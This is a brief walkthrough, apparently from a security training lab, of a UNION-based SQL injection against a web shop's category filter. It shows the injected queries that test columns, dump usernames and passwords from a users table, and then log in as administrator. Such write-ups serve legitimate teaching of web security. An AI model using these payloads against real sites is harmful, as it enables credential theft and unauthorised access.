We first go into a vulnerable web page

![image](https://user-images.githubusercontent.com/65653010/235037756-6db61fd7-941a-4c32-9dbe-b9ea77fad41c.png)

Firsst we check that the strings are present in both the columns by querying

SELECT * FROM someTable WHERE category = 'Gifts' UNION SELECT 'abc' 'def'

![image](https://user-images.githubusercontent.com/65653010/235037939-788bcdbb-b5b1-41ff-8125-e9305a3902d1.png)

Now we retreive some valuable information of the data by adding a query

SELECT * FROM someTable WHERE category = 'Gifts' UNION SELECT username, password FROM users

This helps to retrieve all the username and passwords of the administartor of the page

![image](https://user-images.githubusercontent.com/65653010/235038154-be15bcb9-70fc-47dd-b855-22948e09acfc.png)

With the retreived username and password we login to the site using administrator

![image](https://user-images.githubusercontent.com/65653010/235038993-e8c1d8e8-6603-4a35-81a7-4bb12f43ae78.png)



